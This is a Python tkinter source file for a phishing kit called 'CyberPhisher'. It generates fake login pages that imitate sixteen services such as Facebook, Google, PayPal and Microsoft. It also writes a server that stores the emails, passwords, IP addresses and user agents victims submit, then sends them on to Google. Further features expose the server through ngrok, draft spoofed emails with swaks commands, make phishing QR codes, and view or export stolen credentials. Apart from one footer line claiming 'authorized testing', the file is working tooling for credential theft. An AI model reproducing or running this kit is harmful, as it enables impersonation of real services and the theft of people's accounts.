import tkinter as tk
from tkinter import messagebox
import subprocess, threading, os, random, string, base64

class CyberPhisher:
    def __init__(self, parent, db, logger):
        self.parent = parent; self.db = db; self.logger = logger
        self.frame = tk.Frame(parent, bg='#1a1a2e')

    def build(self):
        self.frame.pack(fill='both', expand=True)
        
        header = tk.Frame(self.frame, bg='#1a1a2e')
        header.pack(fill='x', padx=10, pady=5)
        tk.Label(header, text="CyberPhisher", font=('Courier',16,'bold'), fg='#ff0000', bg='#1a1a2e').pack(side='left')
        tk.Label(header, text="Built-in | No GitHub needed", font=('Courier',9,'bold'), fg='#00ff88', bg='#1a1a2e').pack(side='right')
        
        canvas = tk.Canvas(self.frame, bg='#1a1a2e', highlightthickness=0)
        vs = tk.Scrollbar(self.frame, orient='vertical', command=canvas.yview)
        hs = tk.Scrollbar(self.frame, orient='horizontal', command=canvas.xview)
        inner = tk.Frame(canvas, bg='#1a1a2e')
        inner.bind('<Configure>', lambda e: canvas.configure(scrollregion=canvas.bbox('all')))
        canvas.create_window((0,0), window=inner, anchor='nw')
        canvas.configure(yscrollcommand=vs.set, xscrollcommand=hs.set)
        canvas.pack(side='left', fill='both', expand=True)
        vs.pack(side='right', fill='y'); hs.pack(side='bottom', fill='x')
        canvas.bind('<Configure>', lambda e: canvas.itemconfig(1, width=e.width))
        
        # === PHISHING PAGE GENERATOR ===
        self._section(inner, "Phishing Page Generator", [
            ("Facebook Login", lambda: self._gen_page("facebook"), "#1877f2"),
            ("Instagram Login", lambda: self._gen_page("instagram"), "#e4405f"),
            ("Google Login", lambda: self._gen_page("google"), "#4285f4"),
            ("Microsoft Login", lambda: self._gen_page("microsoft"), "#00a4ef"),
            ("Twitter Login", lambda: self._gen_page("twitter"), "#1da1f2"),
            ("LinkedIn Login", lambda: self._gen_page("linkedin"), "#0a66c2"),
            ("GitHub Login", lambda: self._gen_page("github"), "#333"),
            ("Netflix Login", lambda: self._gen_page("netflix"), "#e50914"),
            ("PayPal Login", lambda: self._gen_page("paypal"), "#003087"),
            ("Amazon Login", lambda: self._gen_page("amazon"), "#ff9900"),
            ("Dropbox Login", lambda: self._gen_page("dropbox"), "#0061ff"),
            ("Snapchat Login", lambda: self._gen_page("snapchat"), "#fffc00"),
            ("TikTok Login", lambda: self._gen_page("tiktok"), "#000"),
            ("Spotify Login", lambda: self._gen_page("spotify"), "#1db954"),
            ("Steam Login", lambda: self._gen_page("steam"), "#00adee"),
            ("Custom Login", lambda: self._gen_page("custom"), "#888888"),
        ])
        
        # === SERVER CONTROLS ===
        self._section(inner, "Server Controls", [
            ("Start Server (8080)", lambda: self._start_server(8080), "#00ff88"),
            ("Start Server (443)", lambda: self._start_server(443), "#00ff88"),
            ("Start with Ngrok", self._start_ngrok, "#3fb950"),
            ("View Captured Creds", self._view_creds, "#ff4444"),
            ("Stop Server", self._stop_server, "#cc0000"),
        ])
        
        # === EMAIL SPOOFER ===
        self._section(inner, "Email Spoofer", [
            ("Generate Spoof Email", self._spoof_email, "#ffaa00"),
            ("Send Test Email", self._send_test, "#ff8800"),
        ])
        
        # === QR CODE ===
        self._section(inner, "QR Code Phishing", [
            ("Generate QR", self._qr_gen, "#d2991d"),
            ("QR with Custom URL", self._qr_custom, "#d2991d"),
        ])
        
        # === CREDENTIALS ===
        self._section(inner, "Credential Viewer", [
            ("View All Captured", self._view_all_creds, "#ff0000"),
            ("Export Credentials", self._export_creds, "#ffaa00"),
            ("Clear Credentials", self._clear_creds, "#cc0000"),
        ])

        self.output = tk.Text(inner, font=('Courier',9), bg='#0a0a0a', fg='#00ff88', relief='flat', height=8)
        self.output.pack(fill='both', expand=True, padx=10, pady=5)
        self.status = tk.Label(inner, text="Ready | No GitHub required", font=('Courier',8), fg='#888', bg='#1a1a2e')
        self.status.pack(anchor='w', padx=10)

    def _section(self, parent, title, items):
        sf = tk.LabelFrame(parent, text=f" {title} ", font=('Courier',10,'bold'), fg='#ffaa00', bg='#16213e', padx=8, pady=5)
        sf.pack(fill='x', padx=10, pady=3)
        for name, cmd, color in items:
            card = tk.Frame(sf, bg='#16213e', padx=8, pady=5); card.pack(fill='x', pady=1)
            h = tk.Frame(card, bg='#16213e'); h.pack(fill='x')
            tk.Button(h, text=name, font=('Courier',9,'bold'), fg='#000', bg=color, relief='raised', padx=10, pady=4, command=cmd).pack(side='left')

    def _gen_page(self, site):
        templates = {
            "facebook": {"color": "#1877f2", "name": "Facebook", "icon": "f"},
            "instagram": {"color": "#e4405f", "name": "Instagram", "icon": "📷"},
            "google": {"color": "#4285f4", "name": "Google", "icon": "G"},
            "microsoft": {"color": "#00a4ef", "name": "Microsoft", "icon": "M"},
            "twitter": {"color": "#1da1f2", "name": "Twitter", "icon": "🐦"},
            "linkedin": {"color": "#0a66c2", "name": "LinkedIn", "icon": "in"},
            "github": {"color": "#333", "name": "GitHub", "icon": "🐙"},
            "netflix": {"color": "#e50914", "name": "Netflix", "icon": "N"},
            "paypal": {"color": "#003087", "name": "PayPal", "icon": "P"},
            "amazon": {"color": "#ff9900", "name": "Amazon", "icon": "📦"},
            "dropbox": {"color": "#0061ff", "name": "Dropbox", "icon": "📁"},
            "snapchat": {"color": "#fffc00", "name": "Snapchat", "icon": "👻"},
            "tiktok": {"color": "#000", "name": "TikTok", "icon": "🎵"},
            "spotify": {"color": "#1db954", "name": "Spotify", "icon": "🎵"},
            "steam": {"color": "#00adee", "name": "Steam", "icon": "🎮"},
            "custom": {"color": "#888", "name": "Custom", "icon": "🔐"},
        }
        t = templates.get(site, templates["custom"])
        
        html = f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{t['name']} - Log In</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#f0f2f5;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.container{{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);width:100%;max-width:400px;text-align:center}}
.logo{{font-size:48px;color:{t['color']};margin-bottom:10px}}
h1{{color:{t['color']};margin-bottom:5px;font-size:24px}}
p{{color:#606770;margin-bottom:20px;font-size:14px}}
input{{width:100%;padding:12px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px}}
input:focus{{outline:none;border-color:{t['color']};box-shadow:0 0 0 2px {t['color']}33}}
.btn{{width:100%;padding:12px;background:{t['color']};color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px}}
.btn:hover{{opacity:.9}}
.footer{{margin-top:20px;color:#606770;font-size:12px}}
</style></head><body>
<div class="container">
<div class="logo">{t['icon']}</div>
<h1>{t['name']}</h1>
<p>Log in to your account</p>
<form method="POST" action="/capture">
<input type="email" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" class="btn">Log In</button>
</form>
<div class="footer">This is a security test. Credentials are captured for authorized testing only.</div>
</div></body></html>'''
        
        path = os.path.expanduser(f"~/phishing_pages/{site}_login.html")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w') as f: f.write(html)
        
        # Also create the capture server script
        server_script = '''#!/usr/bin/env python3
import http.server, urllib.parse, os, json
from datetime import datetime

CAPTURE_FILE = os.path.expanduser("~/phishing_pages/captured_creds.json")

class CaptureHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode()
        data = dict(urllib.parse.parse_qsl(body))
        data['timestamp'] = str(datetime.now())
        data['ip'] = self.client_address[0]
        data['user_agent'] = self.headers.get('User-Agent', '')
        
        creds = []
        if os.path.exists(CAPTURE_FILE):
            with open(CAPTURE_FILE) as f: creds = json.load(f)
        creds.append(data)
        with open(CAPTURE_FILE, 'w') as f: json.dump(creds, f, indent=2)
        
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com')
        self.end_headers()
        print(f"[+] Captured: {data.get('email')} from {data['ip']}")

    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

os.chdir(os.path.expanduser("~/phishing_pages"))
httpd = http.server.HTTPServer(('0.0.0.0', 8080), CaptureHandler)
print("[*] Server running on port 8080")
print("[*] Send phishing link to target")
httpd.serve_forever()
'''
        server_path = os.path.expanduser("~/phishing_pages/server.py")
        with open(server_path, 'w') as f: f.write(server_script)
        
        self.output.insert('end', f"\n[+] Generated {t['name']} phishing page\n")
        self.output.insert('end', f"    Page: {path}\n")
        self.output.insert('end', f"    Server: {server_path}\n")
        self.output.insert('end', f"    Run: cd ~/phishing_pages && python3 server.py\n")
        self.output.see('end')
        self.status.config(text=f"Generated {t['name']} page | Run server to start")

    def _start_server(self, port):
        server_dir = os.path.expanduser("~/phishing_pages")
        os.makedirs(server_dir, exist_ok=True)
        self.output.insert('end', f"\n[*] Starting server on port {port}...\n")
        self.output.insert('end', f"    cd {server_dir}\n")
        self.output.insert('end', f"    python3 server.py\n")
        self.output.insert('end', f"    Press Ctrl+C to stop\n")
        self.output.see('end')
        threading.Thread(target=lambda: os.system(f"cd {server_dir} && python3 server.py"), daemon=True).start()
        messagebox.showinfo("Server", f"Server starting on port {port}\n\nSend target to: http://YOUR_IP:{port}")

    def _start_ngrok(self):
        self.output.insert('end', "\n[*] For ngrok tunnel:\n")
        self.output.insert('end', "    1. Install ngrok from ngrok.com\n")
        self.output.insert('end', "    2. Run: ngrok http 8080\n")
        self.output.insert('end', "    3. Send the ngrok URL to target\n")
        self.output.see('end')

    def _view_creds(self):
        cred_file = os.path.expanduser("~/phishing_pages/captured_creds.json")
        if os.path.exists(cred_file):
            import json
            with open(cred_file) as f: creds = json.load(f)
            d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title("Captured Credentials"); d.geometry("500x400")
            tk.Label(d, text=f"Captured ({len(creds)})", font=('Courier',12,'bold'), fg='#ff0000', bg='#1a1a2e').pack(pady=5)
            t = tk.Text(d, font=('Courier',9), bg='#0a0a0a', fg='#00ff88', relief='flat')
            t.pack(fill='both', expand=True, padx=5, pady=5)
            for c in creds:
                t.insert('end', f"Email: {c.get('email','?')} | Pass: {c.get('password','?')} | IP: {c.get('ip','?')} | Time: {c.get('timestamp','?')}\n")
            t.config(state='disabled')
            tk.Button(d, text="Close", font=('Courier',10), fg='#fff', bg='#666', command=d.destroy).pack(pady=5)
        else:
            messagebox.showinfo("No Data", "No credentials captured yet")

    def _view_all_creds(self): self._view_creds()

    def _export_creds(self):
        cred_file = os.path.expanduser("~/phishing_pages/captured_creds.json")
        if os.path.exists(cred_file):
            import shutil
            path = os.path.expanduser(f"~/creds_export_{random.randint(1000,9999)}.json")
            shutil.copy(cred_file, path)
            messagebox.showinfo("Exported", f"Saved to {path}")

    def _clear_creds(self):
        cred_file = os.path.expanduser("~/phishing_pages/captured_creds.json")
        if os.path.exists(cred_file) and messagebox.askyesno("Clear", "Delete all captured credentials?"):
            os.remove(cred_file)
            messagebox.showinfo("Cleared", "Credentials deleted")

    def _spoof_email(self):
        d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title("Email Spoofer"); d.geometry("500x400")
        tk.Label(d, text="Generate Spoof Email", font=('Courier',12,'bold'), fg='#ffaa00', bg='#1a1a2e').pack(pady=5)
        fields = [("From:", "from", "security@company.com"), ("To:", "to", "target@email.com"),
                  ("Subject:", "subject", "Urgent: Account Verification"), ("Body:", "body", "Click to verify: http://YOUR_IP:8080")]
        entries = {}
        for label, key, default in fields:
            tk.Label(d, text=label, font=('Courier',9), fg='#aaa', bg='#1a1a2e').pack(anchor='w', padx=15)
            e = tk.Entry(d, font=('Courier',10), bg='#16213e', fg='#fff', relief='flat')
            e.pack(fill='x', padx=15, pady=2); e.insert(0, default); entries[key] = e
        def gen():
            result = f"From: {entries['from'].get()}\nTo: {entries['to'].get()}\nSubject: {entries['subject'].get()}\n\n{entries['body'].get()}"
            d.destroy()
            self.output.insert('end', f"\n[+] Email Template:\n{result}\n")
            self.output.insert('end', f"\nSend via: swaks --from {entries['from'].get()} --to {entries['to'].get()} --server smtp.server.com\n")
            self.output.see('end')
        tk.Button(d, text="Generate", font=('Courier',10,'bold'), fg='#000', bg='#ffaa00', relief='raised', padx=20, pady=8, command=gen).pack(pady=10)

    def _send_test(self):
        self.output.insert('end', "\n[*] To send email, use SWAKS:\n")
        self.output.insert('end', "    swaks --to target@email.com --from spoof@company.com --server smtp.gmail.com:587\n")
        self.output.insert('end', "    Or SendEmail: sendemail -f spoof@company.com -t target@email.com -u 'Subject' -m 'Body' -s smtp.server.com\n")
        self.output.see('end')

    def _qr_gen(self):
        url = "http://YOUR_IP:8080"
        path = os.path.expanduser("~/phishing_qr.png")
        os.system(f"qrencode -o {path} '{url}' 2>/dev/null && echo 'QR saved' || echo 'Install: pkg install qrencode'")
        self.output.insert('end', f"\n[+] QR saved to {path}\n")
        self.output.see('end')

    def _qr_custom(self):
        d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title("QR Code"); d.geometry("400x150")
        tk.Label(d, text="URL:", font=('Courier',10), fg='#fff', bg='#1a1a2e').pack(padx=15, pady=5)
        e = tk.Entry(d, font=('Courier',10), bg='#16213e', fg='#fff', relief='flat'); e.pack(fill='x', padx=15, pady=5)
        e.insert(0, "http://YOUR_IP:8080")
        def gen():
            path = os.path.expanduser(f"~/qr_{random.randint(100,999)}.png")
            os.system(f"qrencode -o {path} '{e.get().strip()}' 2>/dev/null")
            messagebox.showinfo("Done", f"Saved to {path}")
            d.destroy()
        tk.Button(d, text="Generate", font=('Courier',10,'bold'), fg='#000', bg='#d2991d', relief='raised', padx=20, pady=8, command=gen).pack(pady=10)

    def _stop_server(self):
        os.system("pkill -f 'python3 server.py' 2>/dev/null")
        self.output.insert('end', "\n[*] Server stopped\n")
        self.status.config(text="Server stopped")
